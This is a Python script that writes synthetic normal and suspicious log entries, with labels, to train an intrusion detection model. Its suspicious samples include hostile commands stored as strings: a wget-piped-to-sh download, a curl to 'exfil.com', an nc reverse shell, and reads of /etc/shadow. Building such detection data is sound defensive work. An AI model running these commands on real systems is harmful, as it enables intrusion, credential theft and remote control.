#!/usr/bin/env python3
"""
Generate sample log entries for testing the detection system.
"""

import json
import random
from datetime import datetime, timedelta
import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / 'src'))


def generate_normal_log():
    """Generate a normal log entry."""
    actions = ['ls', 'cd', 'cat', 'grep', 'find', 'ps', 'top', 'df', 'du']
    users = ['user1', 'user2', 'admin', 'developer']
    ips = ['192.168.1.' + str(i) for i in range(1, 50)]
    
    return {
        'timestamp': (datetime.now() - timedelta(seconds=random.randint(0, 3600))).timestamp(),
        'source_ip': random.choice(ips),
        'user': random.choice(users),
        'action': random.choice(actions),
        'message': f"{random.choice(actions)} /home/{random.choice(users)}",
        'status_code': random.choice([200, 201, 204])
    }


def generate_suspicious_log():
    """Generate a suspicious log entry."""
    suspicious_patterns = [
        {'action': 'sudo', 'message': 'sudo su -', 'user': 'user1'},
        {'action': 'rm', 'message': 'rm -rf /tmp/*', 'user': 'unknown'},
        {'action': 'wget', 'message': 'wget http://malicious.com/script.sh | sh', 'user': 'user2'},
        {'action': 'chmod', 'message': 'chmod 777 /etc/passwd', 'user': 'attacker'},
        {'action': 'cat', 'message': 'cat /etc/shadow', 'user': 'user1'},
        {'action': 'curl', 'message': 'curl http://exfil.com/data | base64', 'user': 'unknown'},
        {'action': 'nc', 'message': 'nc -e /bin/sh 192.168.1.100 4444', 'user': 'user2'},
    ]
    
    pattern = random.choice(suspicious_patterns)
    ips = ['10.0.0.' + str(i) for i in range(1, 10)]  # Different IP range
    
    return {
        'timestamp': (datetime.now() - timedelta(seconds=random.randint(0, 3600))).timestamp(),
        'source_ip': random.choice(ips),
        'user': pattern['user'],
        'action': pattern['action'],
        'message': pattern['message'],
        'status_code': random.choice([403, 404, 500])
    }


def generate_training_data(output_file, num_normal=1000, num_suspicious=100):
    """Generate training data file.
    
    Args:
        output_file: Output file path
        num_normal: Number of normal log entries
        num_suspicious: Number of suspicious log entries
    """
    print(f"Generating training data: {num_normal} normal, {num_suspicious} suspicious")
    
    with open(output_file, 'w') as f:
        # Generate normal logs
        for _ in range(num_normal):
            log = generate_normal_log()
            f.write(json.dumps(log) + '\n')
        
        # Generate suspicious logs
        for _ in range(num_suspicious):
            log = generate_suspicious_log()
            f.write(json.dumps(log) + '\n')
    
    print(f"Training data saved to: {output_file}")


def generate_labels_file(output_file, num_normal=1000, num_suspicious=100):
    """Generate labels file for supervised learning.
    
    Args:
        output_file: Output file path
        num_normal: Number of normal labels (0)
        num_suspicious: Number of attack labels (1)
    """
    print(f"Generating labels: {num_normal} normal (0), {num_suspicious} suspicious (1)")
    
    with open(output_file, 'w') as f:
        # Normal labels
        for _ in range(num_normal):
            f.write('0\n')
        
        # Attack labels
        for _ in range(num_suspicious):
            f.write('1\n')
    
    print(f"Labels saved to: {output_file}")


if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Generate sample log data for testing')
    parser.add_argument('--output', '-o', default='training_data.jsonl',
                       help='Output file for training data')
    parser.add_argument('--labels', '-l', default='labels.txt',
                       help='Output file for labels')
    parser.add_argument('--normal', '-n', type=int, default=1000,
                       help='Number of normal log entries')
    parser.add_argument('--suspicious', '-s', type=int, default=100,
                       help='Number of suspicious log entries')
    parser.add_argument('--labels-only', action='store_true',
                       help='Only generate labels file')
    
    args = parser.parse_args()
    
    if not args.labels_only:
        generate_training_data(args.output, args.normal, args.suspicious)
    
    generate_labels_file(args.labels, args.normal, args.suspicious)
    
    print("\nUsage:")
    print(f"  python main.py --train {args.output} --labels {args.labels}")

